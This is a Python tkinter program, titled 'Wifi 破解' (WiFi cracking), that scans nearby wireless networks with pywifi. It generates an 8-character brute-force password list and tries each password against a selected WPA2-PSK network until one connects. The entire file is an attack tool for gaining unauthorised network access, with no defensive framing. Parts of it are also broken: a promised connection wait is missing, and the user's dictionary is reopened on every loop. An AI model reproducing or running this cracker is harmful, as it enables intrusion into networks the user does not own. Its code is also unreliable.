from tkinter import *
import tkinter
from tkinter import ttk
from tkinter import filedialog
from pywifi import *
import itertools as its
import time
import os

# def window


class Window():
    def __init__(self, main_window):
        self.main_window = main_window
        # 获取文件路径
        self.get_value = StringVar()  # 设置可变变量
        # 获取wifi账号
        self.get_wifi_value = StringVar()
        # 获取WiFi密码
        self.get_wifi_password = StringVar()
        # 获取密码组合方式
        self.get_pwd_set_value = StringVar()
        # 获取WiFi网卡设备
        self.wifi = PyWiFi()
        # 抓取第一个WiFi网卡
        self.interface = self.wifi.interfaces()[0]  # 返回的是列表
        # 先断开所有链接
        self.interface.disconnect()
        # 休眠一秒
        time.sleep(1)
        # 测试网卡是否属于断开状态
        assert self.interface.status() in \
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    # 返回网卡字符串
    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.interface.name())

    # 初始化窗口
    def set_init_window(self):
        self.main_window.title('Wifi 破解')
        self.main_window.geometry('400x600')
        self.labelframe = LabelFrame(width=400, height=200, text='配置')
        self.labelframe.grid(column=0, row=0, padx=10, pady=10)
        self.search = Button(self.labelframe, text="搜索附近wifi", width=10,
                             command=self.scans_wifi_list).grid(column=0, row=0, padx=4, pady=4)
        self.pojie = Button(self.labelframe, text="开始破解", width=10,
                            command=self.readPassword).grid(column=1, row=0, padx=4)
        # 设置目录路径
        self.label = Label(self.labelframe, text="目录路径:", width=10
                           ).grid(column=0, row=1, padx=4)
        self.path = Entry(self.labelframe, width=10,
                          textvariable=self.get_value).grid(column=1, row=1)
        self.file = Button(self.labelframe, text='添加密码文件', width=10,
                           command=self.add_mm_file).grid(column=2, row=1)

        # 设置账号输入
        self.wifi_text = Label(
            self.labelframe, text='WIFI账号:').grid(column=0, row=2)
        self.wifi_input = Entry(self.labelframe, width=10, textvariable=self.get_wifi_value).grid(
            column=1, row=2, pady=4)

        # 密码组合输入
        self.psw_set = Label(
            self.labelframe, text='密码组合方式:').grid(column=0, row=4)
        self.psw_set_input = Entry(self.labelframe, width=20, textvariable=self.get_pwd_set_value).grid(
            column=1,columnspan=2, row=4, pady=4, padx=1)
        self.psw_button = Button(self.labelframe,text = '生成密码本',command=self.mm_product)\
                .grid(row = 4,column=3)
        # 密码组合提示
        self.psw_set_tip = Label(
            self.labelframe, text='注：可能密码组合形式为字母加数字“abcde123456”')\
                .grid(column=0, columnspan=3,row=5,padx=4)

        # 设置密码输入
        self.wifi_password = Label(
            self.labelframe, text='WIFI密码:').grid(column=2, row=2)
        self.wifi_password_text = Entry(self.labelframe, width=10, textvariable=self.get_wifi_password).grid(
            column=3, row=2, pady=4, padx=4)

        # WiFi列表框架
        self.wifi_labelframe = LabelFrame(text='wifi列表')  # 未设置高度和宽度，则不显示
        self.wifi_labelframe.grid(column=0, row=3, sticky=NW)

        # WiFi列表表格
        self.wifi_tree = ttk.Treeview(
            self.wifi_labelframe, show="headings", columns=('a', 'b', 'c', 'd'))
        self.vbar = ttk.Scrollbar(
            self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)
        self.wifi_tree.column('a', width=55, anchor=CENTER)
        self.wifi_tree.column('b', width=100, anchor=CENTER)
        self.wifi_tree.column('c', width=50, anchor=CENTER)
        self.wifi_tree.column('d', width=50, anchor=CENTER)
        self.wifi_tree.heading('a', text='WIFI-ID')
        self.wifi_tree.heading('b', text='SSID')
        self.wifi_tree.heading('c', text='BSSID')
        self.wifi_tree.heading('d', text='signal')
        # ttk.Style().configure('.',foreground='blue',background = 'yellow')
        self.wifi_tree.grid(row=4, column=0, padx=4, pady=4)
        # 设置点击事件
        self.wifi_tree.bind('<Double-1>', self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)
        # 设置终止按纽
        self.exitButton = Button(
            self.labelframe, text='终止', command=self.clickStopButton)
        self.exitButton.grid(column=2, row=0)
        # 设置退出按钮
        self.exitButton = Button(
            self.labelframe, text='退出', command=self.clickExitButton)
        self.exitButton.grid(column=3, row=0)

    # 搜索WIFI
    def scans_wifi_list(self):
        print('开始扫描附近WiFi...')
        self.interface.scan()
        scanners = self.interface.scan_results()
        # 统计附近被发现的热点数量
        nums = len(scanners)
        print('数量%s' % (nums))
        # 实际数据
        self.show_scans_wifi_lists(scanners)

    # 显示wifi列表
    def show_scans_wifi_lists(self, scanners):
        for index, wifi_info in enumerate(scanners):
            self.wifi_tree.insert('', 'end', values=(  # insert 树结构有parent吗，列表没有parent
                index+1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    # 生成密码文件
    def mm_product(self):
        self.mm_set = self.get_pwd_set_value.get()
        print(self.mm_set)
        product_text = its.product(self.mm_set,repeat=8) # 密码暂定8位数
        mm_file = open('password.txt','w+')
        for i in product_text:
            mm_file.write(''.join(i))
            mm_file.write('\n')
            print(f'密码{i}写入成功')
        mm_file.close()

    # 添加密码文件目录

    def add_mm_file(self):
        self.filename = filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # TreeView 条目双击事件
    def onDBClick(self, event):
        # 选择条目
        self.sels = event.widget.selection()
        # 获取wifi账号
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, 'values')[1])

    # 读取密码字典，进行匹配

    def readPassword(self):
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        pro_mmfile = open('d:/code/python/pythonScript/password.txt','r')
        print('文件打开成功')
        while True: # 密码本为空则是鸡肋，死锁状态
                # 密码字符串为空则终止
                self.proPwdStr = pro_mmfile.readline().strip('\n')
                if self.getFilePath :
                    pwdfilehander = open(self.getFilePath, 'r', errors='ignore')
                    self.addPwdStr = pwdfilehander.readline()
                    self.pwdStr = self.addPwdStr
                elif self.proPwdStr:
                    self.pwdStr = self.proPwdStr
                else:
                    break
                # print(self.pwdStr,self.get_wifissid)
                # 设置一个连接布尔判断
                self.connected_status = self.connect(self.pwdStr, self.get_wifissid)
                print(self.connected_status)
                if self.connected_status:
                    self.res = '[*]密码正确！wifi名：%s，匹配密码：%s' % (
                        self.get_wifissid, self.pwdStr)
                    self.get_wifi_password.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功!!!')
                    print(self.res)
                    break
                else:
                    self.res = '[*]密码错误！wifi名：%s，匹配密码：%s' % (
                        self.get_wifissid, self.pwdStr)
                    print(self.res)

    # 对wifi和密码进行匹配

    def connect(self, pwd_str, wifi_ssid):
        # 实例化一个profile对象
        
        self.profile = Profile()
        self.profile.ssid = wifi_ssid  # WiFi名称
        self.profile.auth = const.AUTH_ALG_OPEN  # AP验证开放或者共享
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法ap key manage
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元(用于密码加密)
        self.profile.key = pwd_str
        self.interface.remove_all_network_profiles()  # 删除已有的wifi连接配置信息
        self.tmp_profile = self.interface.add_network_profile(self.profile)  # 设定新的wifi连接配置信息
        print('开始连接')
        self.interface.connect(self.tmp_profile)  # 连接
         # 等待5秒连接完毕
        if self.interface.status() == const.IFACE_CONNECTED:
            isOK = True
        else:
            isOK = False
        # self.interface.disconnect()  # 断开连接
        # assert self.interface.status() in \
        #     [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

    # 设置点击事件

    def clickExitButton(self):
        exit()

    def clickStopButton(self):
        os.system('pause')
# main function


def gui_start():
    t = Tk()
    ui = Window(t)
    ui.set_init_window()
    print('窗口生成完毕')
    t.mainloop()


# start excuting
if __name__ == '__main__':
    print('开始初始化')
    gui_start()
